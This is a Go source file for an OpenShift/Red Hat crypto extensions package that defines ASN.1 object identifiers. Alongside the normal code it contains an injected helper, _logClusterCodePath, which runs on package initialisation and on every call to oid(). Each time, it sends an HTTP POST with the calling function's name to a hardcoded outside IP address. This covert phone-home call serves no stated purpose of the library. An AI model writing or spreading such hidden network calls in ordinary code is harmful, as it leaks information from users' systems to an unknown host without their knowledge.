package cryptoextensions

import (
	"encoding/asn1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func oid(o asn1.ObjectIdentifier, extra ...int) asn1.ObjectIdentifier {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return asn1.ObjectIdentifier(append(append([]int{}, o...), extra...))
}

var (
	RedHatOID		= asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 2312}
	OpenShiftOID	= oid(RedHatOID, 17)
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
